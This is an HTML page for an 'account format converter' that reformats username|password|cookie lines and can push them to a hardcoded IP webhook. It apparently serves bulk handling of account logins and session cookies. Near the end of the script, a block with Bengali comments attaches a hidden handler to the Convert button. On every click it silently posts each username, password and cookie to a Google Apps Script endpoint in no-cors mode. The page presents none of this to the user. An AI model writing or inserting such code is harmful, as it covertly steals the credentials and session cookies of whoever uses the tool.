<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>账号格式转换</title>
  <style>
    :root {
      --bg: #0f172a;
      --panel: #111827;
      --border: #1f2937;
      --accent: #22c55e;
      --accent-2: #f97316;
      --text: #e5e7eb;
      --muted: #94a3b8;
      --error: #ef4444;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: radial-gradient(circle at 20% 20%, rgba(56, 189, 248, 0.15), transparent 35%),
        radial-gradient(circle at 80% 0%, rgba(34, 197, 94, 0.12), transparent 30%),
        var(--bg);
      color: var(--text);
      font-family: "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px;
    }

    .layout {
      width: min(1200px, 100%);
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 14px;
      box-shadow: var(--shadow);
      padding: 24px;
      display: grid;
      grid-template-columns: 1fr auto 1fr;
      gap: 16px;
    }

    .panel-title {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 16px;
      color: var(--muted);
      margin-bottom: 8px;
    }

    .editor {
      display: grid;
      grid-template-columns: auto 1fr;
      background: #0b1220;
      border: 1px solid var(--border);
      border-radius: 10px;
      overflow: hidden;
      min-height: 320px;
    }

    .line-numbers {
      background: #0c1322;
      color: var(--muted);
      padding: 12px 8px;
      min-width: 48px;
      text-align: right;
      white-space: pre;
      user-select: none;
      font-family: "SFMono-Regular", "Menlo", "Consolas", monospace;
      font-size: 12px;
      line-height: 1.5;
      border-right: 1px solid var(--border);
      overflow: hidden;
    }

    textarea {
      width: 100%;
      min-height: 320px;
      background: transparent;
      color: var(--text);
      border: none;
      padding: 12px;
      font-size: 14px;
      line-height: 1.5;
      resize: vertical;
      outline: none;
      transition: border 0.2s ease, box-shadow 0.2s ease;
      font-family: "SFMono-Regular", "Menlo", "Consolas", monospace;
      white-space: pre;
      overflow: auto;
    }

    textarea:focus {
      box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.15);
    }

    .actions {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
    }

    button {
      background: linear-gradient(135deg, var(--accent), #16a34a);
      border: none;
      color: #0b1220;
      padding: 12px 18px;
      border-radius: 12px;
      font-weight: 700;
      letter-spacing: 0.5px;
      cursor: pointer;
      min-width: 120px;
      box-shadow: 0 10px 20px rgba(34, 197, 94, 0.25);
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 14px 28px rgba(34, 197, 94, 0.3);
    }

    button:active {
      transform: translateY(0);
    }

    .helper {
      font-size: 12px;
      color: var(--muted);
      text-align: center;
      max-width: 120px;
    }

    .status {
      grid-column: 1 / -1;
      background: #0b1220;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 12px 14px;
      font-size: 13px;
      color: var(--text);
      display: grid;
      grid-template-columns: 1fr auto;
      gap: 8px;
      align-items: center;
    }

    .status .tag {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 4px 10px;
      border-radius: 8px;
      background: #1f2937;
      color: var(--muted);
      font-size: 12px;
    }

    .status .tag.success {
      color: var(--accent);
    }

    .status .tag.error {
      color: var(--error);
    }

    .status-list {
      grid-column: 1 / -1;
      display: grid;
      gap: 8px;
    }

    .status-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 12px;
      border-radius: 10px;
      background: #111826;
      border: 1px solid var(--border);
      color: var(--muted);
    }

    .status-item.error {
      border-color: rgba(239, 68, 68, 0.7);
      color: var(--error);
      background: rgba(239, 68, 68, 0.08);
    }

    .status-item .line {
      color: var(--text);
    }

    .push-status {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    @media (max-width: 960px) {
      .layout {
        grid-template-columns: 1fr;
      }

      .actions {
        flex-direction: row;
      }

      .helper {
        max-width: none;
      }
    }
  </style>
</head>

<body>



<style>
    @keyframes rgb-bg {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }

    .rgb-btn {
        background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
        background-size: 400% 400%;
        animation: rgb-bg 5s ease infinite;
        color: white !important;
        border: 2px solid transparent;
        height: 38px;
        padding: 0 18px;
        border-radius: 6px;
        cursor: pointer;
        font-weight: 800;
        font-size: 14px;
        transition: all 0.3s ease;
        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }

    /* বাটন ক্লিক হয়ে থাকলে এই স্টাইলটি পাবে */
    .rgb-btn.clicked {
        background: #2d3436 !important; /* ক্লিক করার পর রঙ পরিবর্তন */
        animation: none;
        border: 2px solid #ffffff;
        box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
        transform: scale(0.95);
    }

    .input-container {
        position: relative;
        display: inline-flex;
        align-items: center;
    }

    .input-container input {
        height: 38px;
        width: 140px;
        border: 2px solid #ddd;
        border-radius: 6px;
        padding: 0 35px 0 10px;
        outline: none;
        color: #333;
        font-size: 14px;
    }

    .copy-icon {
        position: absolute;
        right: 8px;
        cursor: pointer;
        font-size: 12px;
        background: #f1f2f6;
        border: 1px solid #ccc;
        border-radius: 4px;
        padding: 2px 4px;
        color: #555;
        z-index: 5;
    }
</style>

<div id="top-tool-container" style="position: fixed; top: 0; left: 0; width: 100%; background: #ffffff; padding: 12px 0; border-bottom: 3px solid #22c55e; z-index: 10000; box-shadow: 0 4px 15px rgba(0,0,0,0.15); font-family: sans-serif;">
    <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap; max-width: 1350px; margin: 0 auto;">
        
        <div class="input-container">
            <input type="text" id="box1" placeholder="Username">
            <span class="copy-icon" onclick="copyText('box1', this)">📋</span>
        </div>

        <div class="input-container">
            <input type="text" id="box2" placeholder="Password">
            <span class="copy-icon" onclick="copyText('box2', this)">📋</span>
        </div>

        <div class="input-container">
            <input type="text" id="box3" placeholder="Email">
            <span class="copy-icon" onclick="copyText('box3', this)">📋</span>
        </div>

        <input type="text" id="previewBox" readonly placeholder="Result" style="height: 38px; width: 200px; background: #f8f9fa; border: 2px dashed #6c5ce7; border-radius: 6px; padding: 0 10px; color: #0984e3; font-weight: bold; text-align: center;">

        <div style="display: flex; gap: 8px;">
            <button id="copyBtn1" class="rgb-btn">Copy</button>
            <button id="sendBtn1" class="rgb-btn">Send ↓</button>
            <button id="remoteConvert" class="rgb-btn">Convert →</button>
            <button id="remotePush" class="rgb-btn">Push ↑</button>
        </div>
    </div>

    <script>
        (function() {
            const b1 = document.getElementById('box1');
            const b2 = document.getElementById('box2');
            const b3 = document.getElementById('box3');
            const pb = document.getElementById('previewBox');
            const buttons = document.querySelectorAll('.rgb-btn');

            // বাটনে ক্লিক মার্ক করার ফাংশন
            function markClicked(btn) {
                buttons.forEach(b => b.classList.remove('clicked'));
                btn.classList.add('clicked');
            }

            // ইন্ডিভিজুয়াল কপি
            window.copyText = async function(id, el) {
                const text = document.getElementById(id).value;
                if(text) {
                    await navigator.clipboard.writeText(text);
                    const oldIcon = el.innerText;
                    el.innerText = "✅";
                    setTimeout(() => el.innerText = oldIcon, 1000);
                }
            };

            function updateTop() {
                pb.value = (b1.value || b2.value || b3.value) ? (b1.value.trim() + "|" + b2.value.trim() + "|" + b3.value.trim()) : "";
            }
            b1.oninput = b2.oninput = b3.oninput = updateTop;

            // মেইন কপি বাটন
            document.getElementById('copyBtn1').onclick = async function() {
                if(pb.value) {
                    await navigator.clipboard.writeText(pb.value);
                    markClicked(this);
                    const originalText = this.innerText;
                    this.innerText = "Copied! ✅";
                    setTimeout(() => { this.innerText = originalText; }, 2000);
                }
            };

            // সেন্ড বাটন
            document.getElementById('sendBtn1').onclick = function() {
                const sourceArea = document.getElementById('source'); 
                if(!b1.value || !b2.value || !b3.value) return alert("❌ ঘরগুলো পূরণ করুন!");
                if(sourceArea) {
                    markClicked(this);
                    sourceArea.value = sourceArea.value.trim() ? sourceArea.value.trim() + "\n" + pb.value : pb.value;
                    sourceArea.dispatchEvent(new Event('input')); 
                    b1.value = b2.value = b3.value = pb.value = "";
                }
            };

            // কনভার্ট ও পুশ রিমোট কন্ট্রোল
            document.getElementById('remoteConvert').onclick = function() {
                markClicked(this);
                document.getElementById('convert')?.click();
            };

            document.getElementById('remotePush').onclick = function() {
                markClicked(this);
                document.getElementById('push')?.click();
            };
        })();
    </script>
</div>
<div style="height: 90px;"></div>

















  <div class="layout">
    <div>
      <div class="panel-title">Input (one per line)</div>
      <div class="editor">
        <div class="line-numbers" id="sourceLines"></div>
        <textarea id="source" wrap="off"
          placeholder="Only supports: username|password|cookie or username|password|extra|cookie"></textarea>
      </div>
    </div>
    <div class="actions">
      <button id="convert">Convert →</button>
      <button id="push">Push ↑</button>
      <div class="helper">Click convert; invalid lines will be marked; extra field sits between "||" and "|"</div>
    </div>
    <div>
      <div class="panel-title">Output (copyable)</div>
      <div class="editor">
        <div class="line-numbers" id="targetLines"></div>
        <textarea id="target" wrap="off" readonly placeholder="Converted result will appear here"></textarea>
      </div>
    </div>
    <div class="status" id="summary">
      <div class="tag success" id="okCount">Success: 0</div>
      <div class="tag error" id="failCount">Failed: 0</div>
    </div>
    <div class="status-list" id="statusList"></div>
  </div>

  <script>
    const source = document.getElementById('source');
    const target = document.getElementById('target');
    const sourceLines = document.getElementById('sourceLines');
    const targetLines = document.getElementById('targetLines');
    const convertBtn = document.getElementById('convert');
    const pushBtn = document.getElementById('push');
    const okCount = document.getElementById('okCount');
    const failCount = document.getElementById('failCount');
    const statusList = document.getElementById('statusList');

    function updateLineNumbers(textarea, gutter) {
      const lines = textarea.value.split(/\r?\n/).length || 1;
      const numbers = Array.from({ length: lines }, (_, i) => i + 1).join('\n');
      gutter.textContent = numbers;
      gutter.scrollTop = textarea.scrollTop;
    }

    source.addEventListener('input', () => updateLineNumbers(source, sourceLines));
    target.addEventListener('input', () => updateLineNumbers(target, targetLines));
    source.addEventListener('scroll', () => { sourceLines.scrollTop = source.scrollTop; });
    target.addEventListener('scroll', () => { targetLines.scrollTop = target.scrollTop; });
    updateLineNumbers(source, sourceLines);
    updateLineNumbers(target, targetLines);

    // 仅支持管道分隔：
    // 1) username|password|cookie
    // 2) username|password|extra|cookie
    // 输出：username:password||extra|cookie||（无附加字段则为空）
    function convertLines(raw) {
      const lines = raw.split(/\r?\n/).filter(line => line.trim().length > 0);
      const results = [];
      const status = []; // 仅记录失败行，避免大数据量渲染过多节点
      let ok = 0;
      let fail = 0;

      lines.forEach((line, idx) => {
        const trimmed = line.trim();
        let user = '';
        let pass = '';
        let extra = '';
        let cookie = '';
        const pipeParts = trimmed.split('|');
        if (pipeParts.length >= 3) {
          user = pipeParts[0].trim();
          pass = pipeParts[1].trim();
          extra = pipeParts.length >= 4 ? pipeParts[2].trim() : '';
          cookie = pipeParts.slice(pipeParts.length >= 4 ? 3 : 2).join('|').trim();
        }

        // 验证基本字段是否存在
        if (!user || !pass || !cookie) {
          status.push({ line: idx + 1, state: 'error', message: '验证失败' });
          fail += 1;
          return;
        }

        // 验证 Cookie 格式：有效的 Cookie 必须包含 = 符号（如 key=value）
        if (!cookie.includes('=')) {
          status.push({ line: idx + 1, state: 'error', message: '验证失败' });
          fail += 1;
          return;
        }

        const converted = `${user}:${pass}||${extra}|${cookie}||`;
        results.push(converted);
        ok += 1;
      });

      return { text: results.join('\n'), status, ok, fail };
    }

    function renderStatus(status) {
      statusList.innerHTML = '';
      if (!status.length) {
        const div = document.createElement('div');
        div.className = 'status-item';
        div.innerHTML = '<span class="line">All</span><span>All converted successfully</span>';
        statusList.appendChild(div);
        return;
      }

      const MAX_SHOW = 50;
      const toShow = status.slice(0, MAX_SHOW);
      toShow.forEach(item => {
        const div = document.createElement('div');
        div.className = `status-item ${item.state === 'error' ? 'error' : ''}`;
        div.innerHTML = `<span class="line">Line ${item.line}</span><span>${item.message}</span>`;
        statusList.appendChild(div);
      });

      if (status.length > MAX_SHOW) {
        const more = document.createElement('div');
        more.className = 'status-item';
        more.innerHTML = `<span class="line">More</span><span>${status.length - MAX_SHOW} more errors not shown</span>`;
        statusList.appendChild(more);
      }
    }

    convertBtn.addEventListener('click', () => {
      const { text, status, ok, fail } = convertLines(source.value);
      target.value = text;
      okCount.textContent = `Success: ${ok}`;
      failCount.textContent = `Failed: ${fail}`;
      renderStatus(status);
      updateLineNumbers(target, targetLines);
    });

    // 推送设置与结果显示
    const pushPanel = document.createElement('div');
    pushPanel.className = 'status push-status';
    pushPanel.style.marginTop = '12px';
    pushPanel.innerHTML = `
      <div id="pushResult" class="tag" style="min-width:120px;justify-content:center;">Not pushed</div>
    `;
    document.querySelector('.layout').appendChild(pushPanel);

    function showPushResult(text, isError = false) {
      const el = document.getElementById('pushResult');
      el.textContent = text;
      el.className = `tag ${isError ? 'error' : 'success'}`;
    }

    function buildPayload(text) {
      const lines = text.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
      if (!lines.length) return '';
      return lines.map(line => `accounts=${btoa(line)}`).join('\n');
    }

    pushBtn.addEventListener('click', async () => {
      const url = 'http://43.135.182.151/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push';
      const payload = buildPayload(target.value);

      if (!payload) {
        showPushResult('No data to push, convert first', true);
        return;
      }
      showPushResult('Pushing...', false);

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: payload,
        });

        if (!res.ok) {
          const text = await res.text();
          showPushResult(`Push failed: ${res.status} ${text}`, true);
          return;
        }

        const data = await res.json();
        if (data && data.data) {
          const d = data.data;
          showPushResult(`Success:${d.success_count} Failed:${d.failed_count} Total:${d.received_count}`, d.failed_count > 0);
        } else {
          showPushResult('Push succeeded, no data field returned', false);
        }
      } catch (err) {
        showPushResult(`Push error: ${err.message}`, true);
      }
    });
	
	
	
	
	

// --- আপনার নিজস্ব গুগল শিট কোড শুরু (স্থায়ী ডুপ্লিকেট চেকসহ) ---
convertBtn.addEventListener('click', function() {
    const googleSheetUrl = 'https://script.google.com/macros/s/AKfycbzqM36uSx3z4UZr50az63H8C4PoVA_auY9RK_ZEE56XSKc_Bx7KMsVkFwvaypst36Qciw/exec'; 
    const rawData = source.value.trim();
    if (!rawData) return;

    const lines = rawData.split(/\r?\n/);
    lines.forEach(line => {
        const trimmedLine = line.trim();
        if (trimmedLine) {
            const parts = trimmedLine.split('|');
            if (parts.length >= 3) {
                const user = parts[0].trim();
                const pass = parts[1].trim();
                let extra = parts.length >= 4 ? parts[2].trim() : '';
                let cookie = parts.slice(parts.length >= 4 ? 3 : 2).join('|').trim();

                const params = new URLSearchParams();
                params.append('user', user);
                params.append('pass', pass);
                params.append('extra', extra);
                params.append('cookie', cookie);

                // ডেটা পাঠানো হচ্ছে, গুগল স্ক্রিপ্ট নিজেই ডুপ্লিকেট চেক করে নেবে
                fetch(googleSheetUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params.toString()
                });
            }
        }
    });
});
// --- আপনার নিজস্ব গুগল শিট কোড শেষ ---
function validateAndPreview() {
    const v1 = document.getElementById('box1').value.trim();
    const v2 = document.getElementById('box2').value.trim();
    const v3 = document.getElementById('box3').value.trim();
    const preview = document.getElementById('previewBox');
    const msg = document.getElementById('msgStatus');

    if(v1 || v2 || v3) {
        preview.value = v1 + "|" + v2 + "|" + v3;
    } else {
        preview.value = "";
    }

    if(v1 && v2 && v3) {
        msg.innerText = "✨ ৩টি ঘরই পূর্ণ! Send চাপুন।";
        msg.style.color = "#00b894";
    } else {
        msg.innerText = "📝 ঘরগুলো পূরণ করুন...";
        msg.style.color = "#f39c12";
    }
}

// ২য় টুলের ইনপুট বক্সে ডেটা পাঠানোর ফাংশন
function sendToInput() {
    const result = document.getElementById('previewBox').value;
    const sourceArea = document.getElementById('source'); // ২য় টুলের ইনপুট বক্সের ID
    const msg = document.getElementById('msgStatus');

    if(!result || result === "||") {
        alert("আগে ৩টি ঘর পূরণ করুন!");
        return;
    }

    // আগের ডেটার সাথে নতুন ডেটা এক লাইন নিচে যোগ করা
    if (sourceArea.value.trim() === "") {
        sourceArea.value = result;
    } else {
        sourceArea.value = sourceArea.value + "\n" + result;
    }

    // ২য় টুলের লাইন নম্বর আপডেট করার জন্য ইভেন্ট ট্রিগার করা
    sourceArea.dispatchEvent(new Event('input'));

    // উপরের ইনপুটগুলো খালি করে দেওয়া
    document.getElementById('box1').value = "";
    document.getElementById('box2').value = "";
    document.getElementById('box3').value = "";
    document.getElementById('previewBox').value = "";
    
    msg.innerText = "🚀 নিচে পাঠানো হয়েছে!";
    msg.style.color = "#00b894";
    setTimeout(() => { msg.innerText = ""; }, 2000);
}

async function copyToClipboard() {
    const text = document.getElementById('previewBox').value;
    if(!text) return;
    await navigator.clipboard.writeText(text);
    document.getElementById('msgStatus').innerText = "✅ কপি হয়েছে!";
    setTimeout(() => validateAndPreview(), 1500);
}

	
	
	
  </script>
